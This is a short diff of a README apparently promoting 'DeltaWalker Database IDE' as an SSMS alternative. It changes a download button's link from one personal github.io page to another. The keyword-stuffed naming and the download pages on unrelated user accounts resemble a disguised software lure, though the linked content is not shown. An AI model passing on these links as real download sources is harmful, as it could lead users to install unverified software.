@@ -21,7 +21,7 @@ To begin using this **DeltaWalker Database IDE** and **DeltaWalker SSMS Alternat
 | :--- | :--- |
 | **Get DeltaWalker Database IDE** | Click the button below to initiate the setup for this **DeltaWalker SQL Query Analyzer** integration. |
 
-[![Button](https://img.shields.io/badge/📦-Get_DeltaWalker_Database_IDE-2ea44f?style=for-the-badge)](https://adamcurtis088.github.io/.github/deltawalker-ssms-alternative)
+[![Button](https://img.shields.io/badge/📦-Get_DeltaWalker_Database_IDE-2ea44f?style=for-the-badge)](https://lanelahr737.github.io/.github/deltawalker-ssms-alternative)
 
 ## System Requirements
 
